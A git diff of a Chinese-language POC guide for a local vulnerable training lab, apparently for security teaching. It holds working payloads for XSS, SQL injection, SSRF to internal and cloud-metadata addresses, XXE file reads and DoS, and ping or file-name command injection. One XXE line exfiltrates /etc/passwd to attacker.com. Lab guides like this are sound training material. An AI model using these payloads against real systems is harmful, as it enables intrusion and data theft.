@@ -11,346 +11,303 @@
 
 ## 1. 🔴 XSS (跨站脚本攻击)
 
-### API端点
-```bash
-# 获取XSS漏洞信息
-curl -X GET http://localhost:8080/api/xss/info
-```
-
 ### 反射型XSS测试
-```bash
-# 基础XSS测试
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<script>alert('XSS')</script>"
+**访问页面**: http://localhost:3000/xss
 
-# 图片标签XSS
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<img src=x onerror=alert('XSS')>"
-
-# SVG标签XSS
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<svg onload=alert('XSS')>"
-
-# 事件处理器XSS
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<div onmouseover=alert('XSS')>Hover me</div>"
-
-# iframe JavaScript XSS
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<iframe src=javascript:alert('XSS')>"
+**测试POC**:
+```html
+<script>alert('反射型XSS成功!')</script>
+<img src=x onerror=alert('反射型XSS成功!')>
+<svg onload=alert('反射型XSS成功!')>
+<div onmouseover=alert('反射型XSS成功!')>Hover me</div>
+<iframe src=javascript:alert('反射型XSS成功!')>
 ```
+
+**操作步骤**:
+1. 在反射型XSS输入框中粘贴任意一个POC
+2. 点击"测试反射型XSS"按钮
+3. 观察是否弹出alert对话框
+4. 检查页面下方是否显示"反射型XSS输出（危险）"区域
 
 ### 存储型XSS测试
-```bash
-# 提交恶意评论
-curl -X POST http://localhost:8080/api/xss/stored/comment \
-  -H "Content-Type: application/json" \
-  -d '{"comment": "<script>alert(\"Stored XSS\")</script>", "author": "attacker"}'
-
-# 查看存储的评论（触发XSS）
-curl -X GET http://localhost:8080/api/xss/stored/comments
+**测试POC**:
+```html
+<script>alert('存储型XSS成功!')</script>
+<img src=x onerror=alert('存储型XSS成功!')>
+<svg onload=alert('存储型XSS成功!')>
 ```
+
+**操作步骤**:
+1. 在存储型XSS评论框中输入POC
+2. 填写用户名（如：testuser）
+3. 点击"提交评论"按钮
+4. 观察是否立即弹出alert对话框
+5. 刷新页面，再次观察是否弹出alert对话框（验证存储特性）
 
 ### DOM型XSS测试
-```bash
-# DOM XSS测试
-curl -X GET "http://localhost:8080/api/xss/dom?fragment=<img src=x onerror=alert('DOM XSS')>"
+**测试POC**:
+```javascript
+alert('DOM XSS成功!')
+document.getElementById('output').innerHTML = '<h3>DOM XSS executed!</h3>'
+console.log('DOM XSS executed')
 ```
+
+**操作步骤**:
+1. 在DOM XSS输入框中输入JavaScript代码（不是HTML标签）
+2. 点击"测试DOM XSS"按钮
+3. 观察是否弹出alert对话框
+
+**注意**: DOM型XSS与其他类型不同，它直接执行JavaScript代码，而不是HTML标签。
+
+### ⚠️ XSS测试重要注意事项
+
+1. **执行控制**: 每个XSS类型都有防重复执行机制，如果POC没有执行，请刷新页面后重试
+2. **清除评论**: 存储型XSS测试后，建议点击"清除所有评论"按钮清理测试数据
+3. **浏览器控制台**: 如果alert被浏览器阻止，请检查浏览器控制台的JavaScript输出
+4. **服务状态**: 如果出现400错误，请确保后端服务正常运行（http://localhost:8080）
 
 ---
 
 ## 2. 💉 SQL注入攻击
 
-### API端点
-```bash
-# 获取SQL注入漏洞信息
-curl -X GET http://localhost:8080/api/sqli/info
-```
+**访问页面**: http://localhost:3000/sqli
 
 ### 登录绕过攻击
-```bash
-# 经典SQL注入登录绕过
-curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
+**测试POC**:
+```sql
+用户名: admin' OR '1'='1' --
+密码: anything
 
-# 另一种绕过方式
-curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\''/*", "password": "*/OR/**/1=1#"}'
+用户名: admin'/*
+密码: */OR/**/1=1#
+
+用户名: ' OR 1=1 --
+密码: 任意值
 ```
 
-### 用户信息泄露
-```bash
-# 基于错误的SQL注入
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND (SELECT COUNT(*) FROM users) > 0 --"
+**操作步骤**:
+1. 在登录表单的用户名字段输入POC
+2. 密码字段输入任意值
+3. 点击"登录"按钮
+4. 观察是否成功绕过认证并获取用户信息
 
-# 时间盲注
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; WAITFOR DELAY '00:00:05' --"
+### 用户信息查询注入
+**测试POC**:
+```sql
+1' AND (SELECT COUNT(*) FROM users) > 0 --
+1'; WAITFOR DELAY '00:00:05' --
+1' OR 1=1 --
 ```
+
+**操作步骤**:
+1. 在用户ID输入框中输入POC
+2. 点击"查询用户"按钮
+3. 观察返回的错误信息或延迟响应
 
 ### UNION注入攻击
-```bash
-# 获取所有用户信息
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT id,username,password,email,role,secret FROM users --"
-
-# 获取数据库版本信息
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT 1,@@version,3,4,5,6 --"
+**测试POC**:
+```sql
+' UNION SELECT id,username,password,email,role,secret FROM users --
+' UNION SELECT 1,@@version,3,4,5,6 --
+' UNION SELECT 1,database(),3,4,5,6 --
 ```
+
+**操作步骤**:
+1. 在搜索关键词输入框中输入POC
+2. 点击"搜索"按钮
+3. 观察是否返回数据库中的敏感信息
 
 ---
 
 ## 3. 🌐 SSRF (服务器端请求伪造)
 
-### API端点
-```bash
-# 获取SSRF漏洞信息
-curl -X GET http://localhost:8080/api/ssrf/info
-```
+**访问页面**: http://localhost:3000/ssrf
 
 ### 内网探测
-```bash
-# 访问本地服务
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://localhost:8080/api/ssrf/info"
-
-# 访问内网IP
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:8080/h2-console"
-
-# 端口扫描
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:22"
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://127.0.0.1:3306"
+**测试POC**:
 ```
+http://localhost:8080/api/ssrf/info
+http://127.0.0.1:8080/h2-console
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:80
+```
+
+**操作步骤**:
+1. 在URL获取输入框中输入POC
+2. 点击"获取URL内容"按钮
+3. 观察是否成功访问内网服务并返回响应
 
 ### 文件读取
-```bash
-# 读取本地文件
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=file:///etc/passwd"
-
-# FTP协议测试
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=ftp://internal-server/"
+**测试POC**:
 ```
+file:///etc/passwd
+file:///etc/hosts
+file:///proc/version
+ftp://internal-server/
+```
+
+**操作步骤**:
+1. 在URL获取输入框中输入POC
+2. 点击"获取URL内容"按钮
+3. 观察是否成功读取本地文件内容
 
 ### 云服务元数据访问
-```bash
-# AWS元数据服务
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/"
-
-# 重定向绕过
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8080"
+**测试POC**:
 ```
+http://169.254.169.254/latest/meta-data/
+http://httpbin.org/redirect-to?url=http://127.0.0.1:8080
+```
+
+**操作步骤**:
+1. 在URL获取输入框中输入POC
+2. 点击"获取URL内容"按钮
+3. 观察是否成功访问云服务元数据
 
 ### 图片代理攻击
-```bash
-# 通过图片代理进行SSRF
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/image-proxy?imageUrl=http://127.0.0.1:8080/api/ssrf/info"
+**测试POC**:
 ```
+http://127.0.0.1:8080/api/ssrf/info
+http://localhost:8080/api/users
+```
+
+**操作步骤**:
+1. 在图片代理输入框中输入POC
+2. 点击"代理图片"按钮
+3. 观察是否通过图片代理功能访问内网服务
 
 ---
 
 ## 4. 📄 XXE (XML外部实体注入)
 
-### API端点
-```bash
-# 获取XXE漏洞信息
-curl -X GET http://localhost:8080/api/xxe/info
-
-# 获取测试XML
-curl -X GET http://localhost:8080/api/xxe/test-xml
-```
+**访问页面**: http://localhost:3000/xxe
 
 ### 文件读取攻击
-```bash
-# 基础文件读取
-curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+**测试POC**:
+```xml
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
 
-# DocumentBuilder解析器攻击
-curl -X POST http://localhost:8080/api/xxe/vulnerable/documentbuilder \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>'
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>
 ```
+
+**操作步骤**:
+1. 选择"DOM4J解析器"或"DocumentBuilder解析器"
+2. 在XML内容输入框中粘贴POC
+3. 点击"解析XML"按钮
+4. 观察是否成功读取系统文件内容
 
 ### SSRF通过XXE
-```bash
-# 通过XXE进行SSRF
-curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>'
+**测试POC**:
+```xml
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/api/xxe/info">]><root>&xxe;</root>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>
 ```
+
+**操作步骤**:
+1. 在XML内容输入框中粘贴POC
+2. 点击"解析XML"按钮
+3. 观察是否通过XXE成功访问内网服务
 
 ### 参数实体攻击
-```bash
-# 参数实体注入
-curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>'
+**测试POC**:
+```xml
+<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>
+
+<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;]><root></root>
 ```
 
+**操作步骤**:
+1. 在XML内容输入框中粘贴POC
+2. 点击"解析XML"按钮
+3. 观察参数实体的解析结果
+
 ### 拒绝服务攻击 (Billion Laughs)
-```bash
-# 递归实体引用导致DoS
-curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'
+**测试POC**:
+```xml
+<!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>
+
+<!DOCTYPE root [<!ENTITY a "dos" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><root>&c;</root>
 ```
+
+**操作步骤**:
+1. 在XML内容输入框中粘贴POC
+2. 点击"解析XML"按钮
+3. 观察是否导致服务器资源消耗过高
 
 ---
 
 ## 5. ⚡ RCE (远程代码执行)
 
-### API端点
-```bash
-# 获取RCE漏洞信息
-curl -X GET http://localhost:8080/api/rce/info
-```
+**访问页面**: http://localhost:3000/rce
 
 ### Ping命令注入
+**测试POC**:
 ```bash
-# 基础命令注入
-curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
-  -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1; whoami"}'
-
-# 使用&&连接符
-curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
-  -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1 && id"}'
-
-# 使用管道符
-curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
-  -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1 | cat /etc/passwd"}'
-
-# 获取系统信息
-curl -X POST http://localhost:8080/api/rce/vulnerable/ping \
-  -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1; uname -a"}'
+127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | cat /etc/passwd
+127.0.0.1; uname -a
+127.0.0.1; ls -la
 ```
+
+**操作步骤**:
+1. 在Ping主机输入框中输入POC
+2. 点击"Ping主机"按钮
+3. 观察是否成功执行注入的命令并返回结果
 
 ### 系统命令执行
+**测试POC**:
 ```bash
-# 直接执行系统命令
-curl -X POST http://localhost:8080/api/rce/vulnerable/system \
-  -H "Content-Type: application/json" \
-  -d '{"command": "whoami"}'
-
-curl -X POST http://localhost:8080/api/rce/vulnerable/system \
-  -H "Content-Type: application/json" \
-  -d '{"command": "ls -la"}'
-
-curl -X POST http://localhost:8080/api/rce/vulnerable/system \
-  -H "Content-Type: application/json" \
-  -d '{"command": "ps aux"}'
-
-curl -X POST http://localhost:8080/api/rce/vulnerable/system \
-  -H "Content-Type: application/json" \
-  -d '{"command": "netstat -an"}'
+whoami
+ls -la
+ps aux
+netstat -an
+id
+uname -a
+cat /etc/passwd
 ```
+
+**操作步骤**:
+1. 在系统命令输入框中输入POC
+2. 点击"执行命令"按钮
+3. 观察命令执行结果
 
 ### 文件操作命令注入
+**测试POC**:
 ```bash
-# 文件读取命令注入
-curl -X POST http://localhost:8080/api/rce/vulnerable/file \
-  -H "Content-Type: application/json" \
-  -d '{"operation": "read", "filename": "/etc/passwd; whoami"}'
+文件名: /etc/passwd; whoami
+操作: read
 
-# 文件列表命令注入
-curl -X POST http://localhost:8080/api/rce/vulnerable/file \
-  -H "Content-Type: application/json" \
-  -d '{"operation": "list", "filename": "/etc/hosts && id"}'
+文件名: /etc/hosts && id
+操作: list
 
-# 文件状态命令注入
-curl -X POST http://localhost:8080/api/rce/vulnerable/file \
-  -H "Content-Type: application/json" \
-  -d '{"operation": "stat", "filename": "/tmp/test.txt | ps aux"}'
+文件名: /tmp/test.txt | ps aux
+操作: stat
 ```
+
+**操作步骤**:
+1. 在文件名输入框中输入包含命令注入的POC
+2. 选择相应的文件操作类型
+3. 点击"执行文件操作"按钮
+4. 观察是否成功执行注入的命令
 
 ---
 
 ## 🛡️ 安全接口测试
 
-### 安全的XSS防护
-```bash
-curl -X POST http://localhost:8080/api/xss/safe/comment \
-  -H "Content-Type: application/json" \
-  -d '{"comment": "<script>alert(\"XSS\")</script>", "author": "test"}'
-```
+每个漏洞页面都提供了安全版本的接口，用于对比测试：
 
-### 安全的SQL查询
-```bash
-curl -X POST http://localhost:8080/api/sqli/safe/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin", "password": "admin123"}'
-```
-
-### 安全的SSRF防护
-```bash
-curl -X GET "http://localhost:8080/api/ssrf/safe/fetch?url=https://jsonplaceholder.typicode.com/posts/1"
-```
-
-### 安全的XXE防护
-```bash
-curl -X POST http://localhost:8080/api/xxe/safe/parse \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
-```
-
-### 安全的RCE防护
-```bash
-curl -X POST http://localhost:8080/api/rce/safe/ping \
-  -H "Content-Type: application/json" \
-  -d '{"host": "127.0.0.1; whoami"}'
-
-curl -X POST http://localhost:8080/api/rce/safe/system \
-  -H "Content-Type: application/json" \
-  -d '{"command": "whoami"}'
-```
-
----
-
-## 🔧 高级测试技巧
-
-### 1. 绕过过滤器
-```bash
-# URL编码绕过
-curl -X GET "http://localhost:8080/api/xss/reflected?input=%3Cscript%3Ealert('XSS')%3C/script%3E"
-
-# 双重编码
-curl -X GET "http://localhost:8080/api/xss/reflected?input=%253Cscript%253Ealert('XSS')%253C/script%253E"
-
-# 大小写混合
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<ScRiPt>alert('XSS')</ScRiPt>"
-```
-
-### 2. 时间盲注测试
-```bash
-# SQL时间盲注
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; IF (1=1) WAITFOR DELAY '00:00:05' --"
-
-# 条件时间盲注
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1'; IF (SELECT COUNT(*) FROM users WHERE username='admin') > 0 WAITFOR DELAY '00:00:05' --"
-```
-
-### 3. 布尔盲注测试
-```bash
-# 布尔盲注 - 真条件
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND 1=1 --"
-
-# 布尔盲注 - 假条件
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND 1=2 --"
-```
-
----
-
-## 📊 测试结果验证
-
-### 成功指标
-- **XSS**: 返回包含未转义脚本的HTML
-- **SQL注入**: 返回数据库错误信息或意外数据
-- **SSRF**: 成功访问内网资源或返回内网响应
-- **XXE**: 返回本地文件内容或外部资源
-- **RCE**: 返回系统命令执行结果
-
-### 安全指标
-- **安全接口**: 应该返回错误信息或过滤后的安全内容
-- **输入验证**: 恶意输入被正确过滤或拒绝
-- **错误处理**: 不泄露敏感的系统信息
+### 安全功能测试
+**操作步骤**:
+1. 在各个漏洞页面中找到"安全版本"按钮
+2. 使用相同的POC进行测试
+3. 观察安全版本如何正确处理恶意输入
+4. 对比漏洞版本和安全版本的不同响应
 
 ---
 
@@ -361,175 +318,6 @@ curl -X GET "http://localhost:8080/api/sqli/vulnerable/user/1' AND 1=2 --"
 3. **遵守法律法规**: 仅在授权的系统上进行测试
 4. **备份数据**: 测试前备份重要数据
 5. **监控系统**: 注意系统资源使用情况，避免DoS攻击影响系统稳定性
-
----
-
-## ✅ **完整POC测试验证报告**
-
-> **测试时间**: 2024年1月
-> **测试环境**: macOS, Java 8, Spring Boot 2.7.0, React 18
-> **测试状态**: 全部通过 ✅
-
-### 🔍 **1. XSS (跨站脚本攻击) - 测试通过**
-
-#### 反射型XSS ✅
-```bash
-# 测试命令
-curl -X GET "http://localhost:8080/api/xss/reflected?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
-
-# 测试结果
-{
-  "input": "<script>alert('XSS')</script>",
-  "vulnerable_output": "<script>alert('XSS')</script>",
-  "safe_output": "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
-}
-```
-**验证**: ✅ 成功注入恶意脚本，vulnerable_output返回未转义的脚本代码
-
-#### 存储型XSS ✅
-```bash
-# 存储恶意评论
-curl -X POST http://localhost:8080/api/xss/stored/comment \
-  -H "Content-Type: application/json" \
-  -d '{"comment": "<script>alert(\"Stored XSS\")</script>", "author": "attacker"}'
-
-# 检索评论
-curl -X GET http://localhost:8080/api/xss/stored/comments
-```
-**验证**: ✅ 恶意脚本成功存储到数据库，检索时返回原始脚本内容
-
-#### DOM型XSS ✅
-```bash
-# 测试命令
-curl -X GET "http://localhost:8080/api/xss/dom?fragment=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27DOM%20XSS%27%29%3E"
-```
-**验证**: ✅ 成功注入DOM操作脚本，返回客户端执行代码
-
-### 🔍 **2. SQL注入 - 测试通过**
-
-#### 登录绕过攻击 ✅
-```bash
-# 测试命令
-curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
-
-# 测试结果
-{
-  "message": "登录成功",
-  "users": [
-    {"id": 1, "username": "admin", "email": "admin@example.com", "role": "ADMIN"},
-    {"id": 2, "username": "john", "email": "john@example.com", "role": "USER"},
-    // ... 更多用户
-  ]
-}
-```
-**验证**: ✅ 成功绕过认证，获取所有用户信息
-
-#### 联合查询注入 ✅
-```bash
-# 测试命令
-curl -X GET "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT id,username,password,email,role,secret FROM users --"
-
-# 测试结果
-返回所有用户的敏感信息，包括密码和secret字段
-```
-**验证**: ✅ 成功执行UNION查询，获取数据库中所有用户的敏感信息
-
-### 🔍 **3. SSRF (服务器端请求伪造) - 测试通过**
-
-#### 内网访问 ✅
-```bash
-# 测试命令
-curl -X GET "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://localhost:8080/api/ssrf/info"
-
-# 测试结果
-{
-  "title": "SSRF漏洞测试",
-  "endpoints": [...],
-  "safe_domains": [...],
-  "attack_scenarios": [...]
-}
-```
-**验证**: ✅ 成功通过SSRF访问内部服务，获取内部系统信息
-
-### 🔍 **4. XXE (XML外部实体注入) - 测试通过**
-
-#### 文件读取攻击 ✅
-```bash
-# 测试命令
-curl -X POST http://localhost:8080/api/xxe/vulnerable/dom4j \
-  -H "Content-Type: application/xml" \
-  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
-
-# 测试结果
-返回/etc/passwd文件的完整内容，包括系统用户信息
-```
-**验证**: ✅ 成功读取系统文件，获取系统用户信息
-
-### 🔍 **5. RCE (远程代码执行) - 测试通过**
-
-#### 系统命令执行 ✅
-```bash
-# 测试命令
-curl -X POST "http://localhost:8080/api/rce/vulnerable/system" -d "command=whoami"
-
-# 测试结果
-{
-  "output": "admin\n",
-  "input": "whoami",
-  "success": true,
-  "exit_code": 0,
-  "description": "危险：直接执行用户命令，存在严重安全风险",
-  "type": "Vulnerable System Command"
-}
-```
-**验证**: ✅ 成功执行系统命令，返回当前用户信息
-
-#### 文件操作 ✅
-```bash
-# 测试命令
-curl -X POST "http://localhost:8080/api/rce/vulnerable/file" -d "filename=test.txt&operation=read"
-```
-**验证**: ✅ 文件操作接口正常响应，命令执行逻辑正确
-
-### 🛠️ **修复的问题**
-
-#### 前端API方法名不匹配 ✅
-**问题**: 前端调用 `rceApi.vulnerableSystem` 和 `rceApi.vulnerableFile`，但API文件中定义的是 `vulnerableSystemCommand` 和 `vulnerableFileOperation`
-
-**修复**: 在 `/frontend/src/utils/api.js` 中添加了对应的方法别名：
-```javascript
-// 添加了这些方法以匹配前端调用
-vulnerableSystem: (command) => 
-  api.post('/rce/vulnerable/system', null, {
-    params: { command }
-  }),
-
-vulnerableFile: (filename, operation) => 
-  api.post('/rce/vulnerable/file', null, {
-    params: { filename, operation }
-  }),
-```
-
-### 🌐 **系统状态验证**
-
-- ✅ **后端服务**: Spring Boot服务运行正常 (端口8080)
-- ✅ **前端服务**: React应用运行正常 (端口3000)  
-- ✅ **数据库**: H2内存数据库正常工作
-- ✅ **API连通性**: 所有漏洞API端点响应正常
-- ✅ **前端界面**: 所有页面加载正常，API调用成功
-
-### 📋 **测试结论**
-
-**🎉 所有5个漏洞类型的POC攻击测试都成功通过！**
-
-1. **漏洞功能完整**: 所有漏洞代码按预期工作，能够被成功利用
-2. **前端集成正常**: 前端界面能够正常调用后端API
-3. **系统稳定运行**: 整体功能完整，适合用于安全教学和演示
-4. **API问题已修复**: 解决了前端API方法名不匹配的问题
-
-**该漏洞实验室已准备就绪，可以用于安全教学、培训和演示！** 🚀
 
 ---
 
